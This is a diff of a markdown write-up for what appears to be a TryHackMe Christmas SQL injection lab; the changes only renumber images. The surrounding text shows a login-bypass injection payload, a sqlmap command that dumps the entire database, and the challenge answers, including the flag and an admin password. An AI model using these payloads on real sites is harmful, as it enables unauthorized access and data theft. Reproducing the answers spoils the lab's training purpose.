@@ -22,11 +22,11 @@ In-depth SQL Injection tutorial: [SQLi Basics](https://tryhackme.com/room/sqliba
 
 ## Challenge
 
-![](../.gitbook/assets/image%20%2875%29.png)
+![](../.gitbook/assets/image%20%2877%29.png)
 
 Without using directory brute forcing, what's Santa's secret login panel?
 
-![](../.gitbook/assets/image%20%289%29.png)
+![](../.gitbook/assets/image%20%2810%29.png)
 
 {% hint style="success" %}
 /santapanel
@@ -34,13 +34,13 @@ Without using directory brute forcing, what's Santa's secret login panel?
 
 Visit Santa's secret login panel and bypass the login using SQLi
 
-![](../.gitbook/assets/image%20%2845%29.png)
+![](../.gitbook/assets/image%20%2846%29.png)
 
 `Username` `'or true --`
 
 `Password` `'--`
 
-![](../.gitbook/assets/image%20%2869%29.png)
+![](../.gitbook/assets/image%20%2871%29.png)
 
 {% hint style="success" %}
 No answer needed
@@ -48,15 +48,15 @@ No answer needed
 
 How many entries are there in the gift database?
 
-![](../.gitbook/assets/image%20%2820%29.png)
+![](../.gitbook/assets/image%20%2821%29.png)
 
 **`Save Item`**
 
 `sqlmap -r santapanel.req --tamper=space2comment --dump-all -dbms sqlite`
 
-![](../.gitbook/assets/image%20%2851%29.png)
+![](../.gitbook/assets/image%20%2853%29.png)
 
-![](../.gitbook/assets/image%20%2813%29.png)
+![](../.gitbook/assets/image%20%2814%29.png)
 
 {% hint style="success" %}
 22
@@ -64,7 +64,7 @@ How many entries are there in the gift database?
 
 What did Paul ask for?
 
-![](../.gitbook/assets/image%20%2826%29.png)
+![](../.gitbook/assets/image%20%2827%29.png)
 
 {% hint style="success" %}
 Github Ownership
@@ -72,7 +72,7 @@ Github Ownership
 
 What is the flag?
 
-![](../.gitbook/assets/image%20%2870%29.png)
+![](../.gitbook/assets/image%20%2872%29.png)
 
 {% hint style="success" %}
 thmfox{All\_I\_Want\_for\_Christmas\_Is\_You}
@@ -80,7 +80,7 @@ thmfox{All\_I\_Want\_for\_Christmas\_Is\_You}
 
 What is admin's password?
 
-![](../.gitbook/assets/image%20%282%29.png)
+![](../.gitbook/assets/image%20%283%29.png)
 
 {% hint style="success" %}
 EhCNSWzzFP6sc7gB
